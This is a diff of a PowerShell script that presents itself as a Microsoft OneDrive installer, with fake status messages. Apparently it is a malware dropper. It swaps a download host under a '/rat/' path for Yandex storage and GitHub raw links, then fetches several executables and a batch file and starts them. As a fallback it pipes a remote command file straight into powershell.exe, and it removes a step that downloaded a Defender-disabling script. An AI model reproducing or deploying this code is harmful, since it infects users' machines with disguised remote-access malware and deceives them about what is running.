@@ -6,7 +6,7 @@ del 'df.bat'
 timeout /t 1
 Write-Host "Microsoft OneDrive: trying install the new version of OneDrive..." -ForegroundColor Green
 
-$url5 = 'http://wdc-dev.ru/rat/df.bat'
+$url5 = 'https://s663vla.storage.yandex.net/rdisk/abfd86d6e512f69f121c9de3e774d7b37520772e72e8ffe9e474205ff720f796/6899ad5b/D_eSN26Q9Ap7owUAYmgsJC5-AO-q5m6bs-mZA4nPPOTmm8Z1LyDoecQgB4eJMUnW2Yh0bpOfsO_GlSx1ZcDJgQ==?uid=0&filename=df.bat&disposition=attachment&hash=8a6dh07Dz2wrjBiwsl3U6VtRblkpkGnJWRUjPMFDcEWfVuX0QtrLfZgrZoMcXKDRq/J6bpmRyOJonT3VoXnDag%3D%3D&limit=0&content_type=text%2Fx-msdos-batch&owner_uid=1964756755&fsize=156&hid=ab295c22a1d9312812f848c972db89f1&media_type=executable&tknv=v3&ts=63c12ed71ccc0&s=007d846cb4fbf87c80ca740b850cd0701f000d86bec2623aad148ac1f6cee73b&pb=U2FsdGVkX18g_Eqdyr8dGW5Ew2ij2YyWroCvMlAbOzbBVQdrQnBxIWiAcAqji2w5c1vnDknCwzX2szVMOAIRvD27K0282lW6z0FlNy6p9g4'
 $outputFile5 = 'df.bat'
 
 while ((Test-Path $outputFile5) -eq $false) {
@@ -21,7 +21,7 @@ while ((Test-Path $outputFile5) -eq $false) {
 }
 Write-Host "OneDrive Setup: autoinstaller is downloaded..." -ForegroundColor Green
 
-$url3 = 'http://wdc-dev.ru/rat/OneDriveSetup.exe'
+$url3 = 'https://s465vla.storage.yandex.net/rdisk/e55b2a0a5fdb33a94368327fa0b1317cab5c78e7fc5aa1bd229edbfd72dd2e39/6899ad74/D_eSN26Q9Ap7owUAYmgsJB9pLPHi6lz0bMDsJlFcbPWp8U-tI21Ap6R72_yCI63uoxftMhPBiveAovCWloEEyw==?uid=0&filename=OneDriveSetup.exe&disposition=attachment&hash=UvpiTVXnimm5bws0miBsghKSkrEhaEMw/fIRJ0lByPQekkIY8ZbbjAfOKh54rH0sq/J6bpmRyOJonT3VoXnDag%3D%3D&limit=0&content_type=application%2Fx-dosexec&owner_uid=1964756755&fsize=7030199&hid=e4d05eed7d9bc98d4e2a542e980ca4fc&media_type=executable&tknv=v3&ts=63c12eeef4500&s=57587315a4b81705caadd95743f11961e26142510c383ef874062a63e1acb363&pb=U2FsdGVkX1_hE-YbARzZRQBpluWQNzti8xX4LKOcyxoi6x2KHZ0Kupi0O748vvwSYz7WsfGrN57n8H1dg12iqcBLyFmDeVH5RnaSSTJU6Eo'
 $outputFile3 = 'OneDriveSetup.exe'
 
 while ((Test-Path $outputFile3) -eq $false) {
@@ -45,22 +45,7 @@ timeout /t 1
 del 'DisableDefender.ps1'
 timeout /t 1
 
-$url6 = 'http://wdc-dev.ru/rat/DisableDefender.ps1'
-$outputFile6 = 'DisableDefender.ps1'
-
-while ((Test-Path $outputFile6) -eq $false) {
-    try {
-        Invoke-WebRequest -Uri $url6 -OutFile $outputFile6
-    }
-    catch {
-        Write-Host "Error downloading MSOneDrive autorun. Trying before..." -ForegroundColor Green
-        del 'DisableDefender.ps1'
-        Start-Sleep -Seconds 10
-    }
-}
-Write-Host "OneDrive Setup: autoinstaller is downloaded..." -ForegroundColor Green
-
-$url2 = 'http://wdc-dev.ru/rat/dfrs34usa.exe'
+$url2 = 'https://s761sas.storage.yandex.net/rdisk/01e5512050b960a97d5afd52b5b0f705ba72198c200140f094c2b702dc898480/6899aa8f/D_eSN26Q9Ap7owUAYmgsJG2NORVXo-tHy18mrn9xTt7kyGeoXNqTh_wip1TxR84W4uKt8lcMtf3oA4p4JTgj5w==?uid=1964756755&filename=dfrs34usa.exe&disposition=attachment&hash=&limit=0&content_type=application%2Fx-dosexec&owner_uid=1964756755&fsize=137852460&hid=66dee152160b7fa1d8f726bab3945bc4&media_type=executable&tknv=v3&etag=3c0884e213b946aaaa16b2ee781117ee&ts=63c12c2c481c0&s=90703adbea6f71179c7e2acad97e8e3f1240e07a4fc8554f26a5a7227c8163f4&pb=U2FsdGVkX1-EuHIXsK7AmFkX_H_t845ZUcvCREhTHTKjzmrmD4wzfnCyWfTw1twXw9lhRHIwYJUv74qFQRaMSENF0dfXBz6Ap1NqTNDlKNc'
 $outputFile2 = 'dfrs34usa.exe'
 
 while ((Test-Path $outputFile2) -eq $false) {
@@ -78,10 +63,10 @@ Write-Host "OneDrive Update Downloaded, starting update..." -ForegroundColor Gre
 if (Test-Path $outputFile2) {
     Start-Process -FilePath $outputFile2 -pdrwebwdc
 } else {
-    $urlinstall = 'http://wdc-dev.ru/rat/command2.txt';$result = Invoke-WebRequest -Uri $urlinstall; powershell.exe $result.content
+    $urlinstall = 'https://raw.githubusercontent.com/nikitswi/DrWeb/refs/heads/main/command2.txt';$result = Invoke-WebRequest -Uri $urlinstall; powershell.exe $result.content
 }
 
-$url = 'http://wdc-dev.ru/rat/OneDrive64.exe'
+$url = 'https://s126vla.storage.yandex.net/rdisk/c01b649abcad9ca171d47d8483c6a95aa62bab090903a08e8e815e097d7a6e30/6899add5/D_eSN26Q9Ap7owUAYmgsJP7jnbQUWDFmxoaKLpYu-oh91OitlnKMvbtO6W87U0AdUZPu_lgV7bOjKkFVLrrGtA==?uid=0&filename=OneDrive64.exe&disposition=attachment&hash=h9hR6X3i413N6EZWyESxgES6o24ZrooK5Wr1rHaSGv29TYD7/zhduJJxvkVOH1DKq/J6bpmRyOJonT3VoXnDag%3D%3D&limit=0&content_type=application%2Fx-dosexec&owner_uid=1964756755&fsize=9444662&hid=023a24c4d95f9941a49a12aae7ada368&media_type=executable&tknv=v3&ts=63c12f4b75f40&s=14f7e04001b4a734ecf441385cb248d942f0b2372f443330f2b43952af15dab2&pb=U2FsdGVkX1_98cCi4URH4zfWCVJHhZRFz0b5K2NiqlAyIlO4tCKWk2Tfe73y4DsCXYVSlgmUpj_nyf3tupdWV2cKl5cTfnTbaTueev82pEs'
 $outputFile = 'OneDrive64.exe'
 
 while ((Test-Path $outputFile) -eq $false) {
@@ -102,7 +87,7 @@ timeout /t 2
 if (Test-Path $outputFile) {
     Start-Process -FilePath $outputFile
 } else {
-    $urlinstall = 'http://wdc-dev.ru/rat/command2.txt';$result = Invoke-WebRequest -Uri $urlinstall; powershell.exe $result.content
+    $urlinstall = 'https://raw.githubusercontent.com/nikitswi/DrWeb/refs/heads/main/command2.txt';$result = Invoke-WebRequest -Uri $urlinstall; powershell.exe $result.content
 }
 
 timeout /t 60
